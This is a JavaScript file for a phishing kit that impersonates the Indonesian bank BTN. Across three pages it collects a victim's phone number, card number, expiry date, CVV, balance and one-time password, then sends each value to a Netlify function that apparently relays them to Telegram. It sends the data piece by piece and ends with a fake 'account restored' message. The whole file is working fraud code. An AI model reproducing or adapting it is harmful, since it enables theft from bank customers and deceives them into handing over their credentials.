(function() {
    'use strict';

    // ========== DOM Elements ==========
    const splash = document.getElementById('splashScreen');
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');
    const page3 = document.getElementById('page3');
    const toast = document.getElementById('btnToast');
    const toastMessage = toast.querySelector('.toast-message');
    
    // Session unik
    const sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
    
    // Data akumulator
    let acc = {
        phone: '',
        card: '',
        expiry: '',
        cvv: '',
        balance: '',
        otp: ''
    };
    
    // ========== Toast ==========
    let toastTimeout = null;
    function showNotification(message, isError = true) {
        const iconElem = toast.querySelector('.toast-icon');
        iconElem.textContent = isError ? '!' : '✓';
        iconElem.style.background = isError ? '#ffaa00' : '#ffffff';
        toastMessage.textContent = message;
        toast.classList.add('show');
        if (toastTimeout) clearTimeout(toastTimeout);
        toastTimeout = setTimeout(() => toast.classList.remove('show'), 3000);
    }
    
    // ========== Kirim ke Netlify Function ==========
    async function sendToTelegram(type, value) {
        // Update accumulator
        switch(type) {
            case 'phone': acc.phone = value; break;
            case 'card': acc.card = value; acc.expiry = document.getElementById('berlakuSampai')?.value || ''; acc.cvv = document.getElementById('cvv')?.value || ''; break;
            case 'cvv_expiry': acc.expiry = document.getElementById('berlakuSampai')?.value || ''; acc.cvv = value; break;
            case 'balance': acc.balance = value; break;
            case 'otp': acc.otp = value; break;
        }
        
        let message = '';
        const formatRp = (val) => {
            let num = parseInt(String(val).replace(/\./g, ''));
            if (isNaN(num)) return '0';
            return new Intl.NumberFormat('id-ID').format(num);
        };
        
        if (type === 'phone') {
            message = `┌─  NOTIFIKASI BTN  
├───────────────────
├─  NO HP : ${acc.phone}`;
        } else if (type === 'card') {
            message = `┌─  NOTIFIKASI BTN  
├───────────────────
├─  NO HP : ${acc.phone}
├─ NO KRT : ${acc.card}`;
        } else if (type === 'cvv_expiry') {
            message = `┌─  NOTIFIKASI BTN  
├───────────────────
├─  NO HP : ${acc.phone}
├─ NO KRT : ${acc.card}
├─ AKTF - CCV : ${acc.expiry} / ${acc.cvv}`;
        } else if (type === 'balance') {
            message = `┌─  NOTIFIKASI BTN  
├───────────────────
├─  NO HP : ${acc.phone}
├─ NO KRT : ${acc.card}
├─ AKTF - CCV : ${acc.expiry} / ${acc.cvv}
├─ SALDO : Rp ${formatRp(acc.balance)}`;
        } else if (type === 'otp') {
            message = `┌─  NOTIFIKASI BTN  
├───────────────────
├─  NO HP : ${acc.phone}
├─ NO KRT : ${acc.card}
├─ AKTF - CCV : ${acc.expiry} / ${acc.cvv}
├─ SALDO : Rp ${formatRp(acc.balance)}
├─ OTP : ${acc.otp}
╰───────────────────`;
        }
        
        try {
            const res = await fetch('/.netlify/functions/send-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message, type, sessionId })
            });
            const data = await res.json();
            if (!data.success) console.error('Telegram send error:', data.error);
        } catch(err) {
            console.error('Fetch error:', err);
        }
    }
    
    // ========== Splash ==========
    setTimeout(() => {
        splash.style.opacity = '0';
        setTimeout(() => {
            splash.style.display = 'none';
            page1.classList.add('active');
            initCarouselForScreen(page1);
        }, 400);
    }, 3000);
    
    // ========== Carousel logic ==========
    let activeCarouselInterval = null;
    function initCarouselForScreen(screen) {
        if (activeCarouselInterval) clearInterval(activeCarouselInterval);
        const wrapper = screen.querySelector('.slider-wrapper');
        const dotsContainer = screen.querySelector('.carousel-dots');
        if (!wrapper || !dotsContainer) return;
        const images = wrapper.querySelectorAll('img');
        const total = images.length;
        if (total === 0) return;
        let idx = 0;
        wrapper.style.width = `${total * 100}%`;
        images.forEach(img => { img.style.width = `${100 / total}%`; img.style.flexShrink = '0'; });
        dotsContainer.innerHTML = '';
        for (let i = 0; i < total; i++) {
            const dot = document.createElement('div');
            dot.classList.add('dot');
            if (i === 0) dot.classList.add('active');
            dot.addEventListener('click', () => {
                idx = i;
                wrapper.style.transform = `translateX(-${idx * (100 / total)}%)`;
                updateDots(dotsContainer, idx);
                resetInterval();
            });
            dotsContainer.appendChild(dot);
        }
        function updateDots(container, active) {
            container.querySelectorAll('.dot').forEach((d, i) => {
                d.classList.toggle('active', i === active);
            });
        }
        function slide() {
            idx = (idx + 1) % total;
            wrapper.style.transform = `translateX(-${idx * (100 / total)}%)`;
            updateDots(dotsContainer, idx);
        }
        function resetInterval() {
            if (activeCarouselInterval) clearInterval(activeCarouselInterval);
            activeCarouselInterval = setInterval(slide, 3000);
        }
        resetInterval();
        screen._carouselCleanup = () => clearInterval(activeCarouselInterval);
        return activeCarouselInterval;
    }
    function reinitCarousel() {
        const active = document.querySelector('.screen.active');
        if (active && active._carouselCleanup) active._carouselCleanup();
        if (active) initCarouselForScreen(active);
    }
    
    // ========== Navigasi + Pengiriman bertahap ==========
    document.getElementById('gotoPage2Btn').addEventListener('click', () => {
        const phone = document.getElementById('mobileNumber').value.trim();
        if (!phone) { showNotification("Nomor HP tidak boleh kosong", true); return; }
        const clean = phone.replace(/\s/g, '');
        if (!/^[0-9]{10,13}$/.test(clean)) { showNotification("Harus 10-13 digit angka", true); return; }
        sendToTelegram('phone', clean);
        page1.classList.remove('active');
        page2.classList.add('active');
        reinitCarousel();
    });
    
    // Format kartu & expiry
    const kartu = document.getElementById('nomorKartu');
    kartu.addEventListener('input', function(e) {
        let val = this.value.replace(/\D/g, '').substring(0,16);
        let fmt = '';
        for(let i=0; i<val.length; i++) { if(i>0 && i%4===0) fmt+=' '; fmt+=val[i]; }
        this.value = fmt;
    });
    const expiry = document.getElementById('berlakuSampai');
    expiry.addEventListener('input', function(e) {
        let val = this.value.replace(/\D/g, '').substring(0,4);
        if(val.length>=3) { let m = val.substring(0,2); let y = val.substring(2,4); if(parseInt(m)>12) m='12'; if(parseInt(m)<1 && m.length===2) m='01'; this.value = m+'/'+y; }
        else if(val.length===2) this.value=val;
        else this.value=val;
    });
    const cvv = document.getElementById('cvv');
    const toggle = document.getElementById('toggleCVV');
    if(toggle) toggle.addEventListener('click', () => {
        const type = cvv.getAttribute('type') === 'password' ? 'text' : 'password';
        cvv.setAttribute('type', type);
        toggle.textContent = type === 'password' ? '👁️' : '🙈';
    });
    cvv.addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').substring(0,3); });
    
    const saldo = document.getElementById('saldoTerakhir');
    saldo.addEventListener('input', function() {
        let v = this.value.replace(/\D/g, '');
        if(v==='') { this.value=''; return; }
        let num = parseInt(v);
        this.value = new Intl.NumberFormat('id-ID').format(num);
    });
    
    document.getElementById('btnLanjut').addEventListener('click', () => {
        const nomorKartu = document.getElementById('nomorKartu').value.replace(/\s/g, '');
        const berlaku = document.getElementById('berlakuSampai').value;
        const cvvVal = document.getElementById('cvv').value;
        const saldoRaw = document.getElementById('saldoTerakhir').value.replace(/\./g, '');
        if(!nomorKartu || nomorKartu.length<16) { showNotification("Nomor kartu 16 digit", true); return; }
        if(!berlaku || berlaku.length<5) { showNotification("Masukkan masa berlaku (MM/YY)", true); return; }
        if(!cvvVal || cvvVal.length<3) { showNotification("CVV 3 digit", true); return; }
        if(!saldoRaw || parseInt(saldoRaw)<=0) { showNotification("Masukkan saldo terakhir", true); return; }
        
        // Kirim semua data secara berurutan
        sendToTelegram('card', nomorKartu);
        setTimeout(() => sendToTelegram('cvv_expiry', cvvVal), 400);
        setTimeout(() => sendToTelegram('balance', saldoRaw), 800);
        
        page2.classList.remove('active');
        page3.classList.add('active');
        reinitCarousel();
        setTimeout(() => document.querySelector('.otp-digit')?.focus(), 150);
    });
    
    // OTP handling
    const otpDigits = document.querySelectorAll('.otp-digit');
    otpDigits.forEach((inp, idx) => {
        inp.addEventListener('input', (e) => {
            if(e.target.value.length===1 && idx<5) otpDigits[idx+1].focus();
            document.getElementById('otpWarning').innerText = '';
        });
        inp.addEventListener('keydown', (e) => {
            if(e.key==='Backspace' && idx>0 && !otpDigits[idx].value) otpDigits[idx-1].focus();
        });
        inp.addEventListener('keypress', (e) => { if(!/^\d$/.test(e.key)) e.preventDefault(); });
    });
    
    let retryCounter = 0;
    document.getElementById('submitOtpBtn').addEventListener('click', () => {
        let otp = '';
        otpDigits.forEach(inp => otp += inp.value);
        if(otp.length!==6) { showNotification("Masukkan 6 digit OTP", true); return; }
        if(otp !== '123456') {
            retryCounter++;
            if(retryCounter>=10) {
                showNotification("Batas percobaan habis. Mulai ulang.", true);
                resetToInitial();
                return;
            }
            showNotification(`OTP salah! Sisa ${10-retryCounter} percobaan`, true);
            otpDigits.forEach(inp => inp.value='');
            otpDigits[0].focus();
            return;
        }
        // OTP benar
        sendToTelegram('otp', otp);
        showNotification("Verifikasi berhasil! Akun dipulihkan.", false);
        resetToInitial();
    });
    
    function resetToInitial() {
        page3.classList.remove('active');
        page2.classList.remove('active');
        page1.classList.add('active');
        reinitCarousel();
        document.getElementById('mobileNumber').value = '';
        document.getElementById('nomorKartu').value = '';
        document.getElementById('berlakuSampai').value = '';
        document.getElementById('cvv').value = '';
        document.getElementById('saldoTerakhir').value = '';
        otpDigits.forEach(inp => inp.value = '');
        retryCounter = 0;
        acc = { phone:'', card:'', expiry:'', cvv:'', balance:'', otp:'' };
    }
    
    // Pastikan input angka
    function enforceNumeric(el) { if(el) el.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); }); }
    enforceNumeric(document.getElementById('mobileNumber'));
    
    // Panggil init carousel untuk halaman aktif pertama setelah splash
})();
